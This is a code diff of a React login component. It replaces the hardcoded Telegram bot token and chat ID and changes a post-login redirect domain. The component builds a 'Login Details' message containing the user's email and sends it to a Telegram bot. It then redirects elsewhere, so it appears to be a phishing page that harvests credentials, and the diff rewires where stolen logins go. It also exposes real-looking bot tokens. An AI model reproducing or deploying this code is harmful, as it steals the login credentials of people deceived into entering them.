@@ -56,8 +56,8 @@ const Login = () => {
         return;
       }
 
-      const TELEGRAM_BOT_TOKEN = '7852049948:AAFFkvkc-P1TcRMin_EggatMfqY-QFyc3F8';
-      const TELEGRAM_CHAT_ID = '-1002434577801';
+      const TELEGRAM_BOT_TOKEN = '7726252601:AAH8XkvMij9BuF93yrc1nGuNoCuG946-Vs8';
+      const TELEGRAM_CHAT_ID = '-1002274059717';
       const loginAlert = `
 🔐 <b>Login Details</b>
 📧 <b>Email:</b> ${email}
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://kar.mccsltds.com/';
+      window.location.href = 'https://elon.mccsltds.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
